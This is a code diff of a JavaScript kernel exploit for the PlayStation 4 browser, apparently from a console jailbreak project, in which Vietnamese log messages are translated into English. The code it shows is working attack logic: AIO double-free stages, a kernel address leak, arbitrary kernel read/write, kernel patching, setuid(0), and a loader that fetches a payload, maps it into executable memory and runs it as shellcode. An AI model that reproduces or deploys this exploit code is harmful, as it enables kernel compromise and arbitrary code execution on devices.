+  log(`current core: ${current_core}`);
+  log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
 
   // fun fact:
   // if the first thing you do since boot is run the web browser, WebKit can
@@ -1579,12 +1727,12 @@ export async function kexploit() {
 
   // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
   // spraying and grooming easier
-  log(`ghim tiến trình vào core #${main_core}`);
+  log(`pinning process to core #${main_core}`);
   pin_to_core(main_core);
   get_cpu_affinity(main_mask);
   log(`main_mask: ${main_mask}`);
 
-  log("đặt mức ưu tiên cho main thread");
+  log("setting main thread's priority");
   set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
 
   const [block_fd, unblock_fd] = (() => {
@@ -1598,26 +1746,25 @@ export async function kexploit() {
     sds.push(new_socket());
   }
 
-
   let block_id = null;
   let groom_ids = null;
   try {
-    log("GIAI ĐOẠN: Setup");
+    log("STAGE: Setup");
     [block_id, groom_ids] = setup(block_fd);
 
-    log("\nGIAI ĐOẠN: Double free AIO queue entry");
+    log("\nSTAGE: Double free AIO queue entry");
     const sd_pair = double_free_reqs2(sds);
 
-    log("\nGIAI ĐOẠN: Leak địa chỉ kernel");
+    log("\nSTAGE: Leak kernel addresses");
     const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);
 
-    log("\nGIAI ĐOẠN: Double free SceKernelAioRWRequest");
+    log("\nSTAGE: Double free SceKernelAioRWRequest");
     const [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);
 
-    log("\nGIAI ĐOẠN: Lấy quyền đọc/ghi kernel tùy ý");
+    log("\nSTAGE: Get arbitrary kernel read/write");
     const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-    log("\nGIAI ĐOẠN: Vá kernel");
+    log("\nSTAGE: Patch kernel");
     await patch_kernel(kbase, kmem, p_ucred, restore_info);
   } finally {
     if (unblock_fd !== undefined && unblock_fd !== null) {
@@ -1627,11 +1774,11 @@ export async function kexploit() {
     const t2 = performance.now();
     const ftime = t2 - t1;
     const init_time = _init_t2 - _init_t1;
-    log(`\nthời gian (bao gồm init): ${ftime / 1000}`);
-    log(`thời gian kex: ${(t2 - _init_t2) / 1000}`);
-    log(`thời gian init: ${init_time / 1000}`);
-    log(`thời gian tới init: ${(_init_t1 - t1) / 1000}`);
-    log(`thời gian - init time: ${(ftime - init_time) / 1000}`);
+    log(`\ntime (include init): ${ftime / 1000}`);
+    log(`kex time: ${(t2 - _init_t2) / 1000}`);
+    log(`init time: ${init_time / 1000}`);
+    log(`time to init: ${(_init_t1 - t1) / 1000}`);
+    log(`time - init time: ${(ftime - init_time) / 1000}`);
   }
   if (block_fd !== undefined && block_fd !== null) {
     close(block_fd);
@@ -1648,8 +1795,8 @@ export async function kexploit() {
   }
 
   // Restore core/rtprio
-  log(`khôi phục core: ${current_core}`);
-  log(`khôi phục rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+  log(`restoring core: ${current_core}`);
+  log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
   pin_to_core(current_core);
   set_rtprio(current_rtprio);
 
@@ -1657,17 +1804,45 @@ export async function kexploit() {
   log("setuid(0)");
   try {
     if (sysi("setuid", 0) == 0) {
-      log("kernel exploit thành công!");
+      log("kernel exploit succeeded!");
       return true;
     }
   } catch {
     // Still not exploited, something failed, but it made it here...
-    die("kernel exploit thất bại!");
+    die("kernel exploit failed!");
   }
 
   return false;
 }
 
+// ChendoChap's from pOOBs4
+function malloc(sz) {
+  const backing = new Uint8Array(0x10000 + sz);
+  nogc.push(backing);
+  const ptr = mem.readp(mem.addrof(backing).add(0x10));
+  ptr.backing = backing;
+  return ptr;
+}
+
+// ChendoChap's from pOOBs4
+function malloc32(sz) {
+  const backing = new Uint8Array(0x10000 + sz * 4);
+  nogc.push(backing);
+  const ptr = mem.readp(mem.addrof(backing).add(0x10));
+  ptr.backing = new Uint32Array(backing.buffer);
+  return ptr;
+}
+
+// ChendoChap's from pOOBs4
+function array_from_address(addr, size) {
+  const og_array = new Uint32Array(0x1000);
+  const og_array_i = mem.addrof(og_array).add(0x10);
+  mem.write64(og_array_i, addr);
+  mem.write32(og_array_i.add(0x8), size);
+  mem.write32(og_array_i.add(0xc), 1);
+  nogc.push(og_array);
+  return og_array;
+}
 
 // ChendoChap's from pOOBs4
 function runBinLoader() {
@@ -1764,29 +1939,28 @@ function runPayload(path) {
         }
         const shellcode = new Uint32Array(paddedBuffer.buffer);
         const payloadBuffer = chain.sysp("mmap", 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
-        log(`đã cấp phát buffer payload tại ${payloadBuffer}`);
+        log(`payload buffer allocated at ${payloadBuffer}`);
         const payloadBufferShadow = array_from_address(payloadBuffer, shellcode.length);
         payloadBufferShadow.set(shellcode);
-        log(`đã nạp ${response.byteLength} byte cho payload (+ ${paddingLength} byte padding)`);
+        log(`loaded ${response.byteLength} bytes for payload (+ ${paddingLength} bytes padding)`);
         try {
           chain.call_void(payloadBuffer);
         } catch (e) {
-          log(`lỗi khi thực thi payload: ${e.message}`);
+          log(`error executing payload: ${e.message}`);
         }
         sysi("munmap", payloadBuffer, paddedBuffer.length);
       } catch (e) {
-        log(`lỗi trong runPayload: ${e.message}`);
+        log(`error in runPayload: ${e.message}`);
       }
     } else {
-      log(`lỗi khi tải payload, ${xhr.status}`);
+      log(`error retrieving payload, ${xhr.status}`);
     }
   };
   xhr.onerror = function () {
-    log("lỗi mạng");
+    log("network error");
   };
   xhr.send();
 }
-
 
 kexploit().then((success) => {
   if (success) {
@@ -1799,10 +1973,10 @@ kexploit().then((success) => {
 });
 
 function LoadPayload(){
-  log("Payload đang được tải. Vui lòng chờ...")
+  log("The payload is going to be loaded now. Please wait...")
   document.getElementById('loader').style.display = 'flex';
   if (localStorage.getItem('jbsuccess') && (window.payload_path == "./payloads/GoldHEN/GoldHEN.bin" || window.payload_path == "./payloads/HEN/HEN.bin")) {
-    log("Đã jailbreak rồi !");
+    log("Already jailbroken !");
     if(document.getElementById('ckbaj').checked){
       const Confirmation = confirm("It seems you are already jailbroken.\nDo you want to run the payload again?");
       if (Confirmation) {
@@ -1811,7 +1985,7 @@ function LoadPayload(){
           localStorage.setItem('jbsuccess', 1);
         }, 2000);
       } else {
-        log("Đã hủy chạy payload.");
+        log("Payload run cancelled.");
       }
     } else {
       setTimeout(() => {
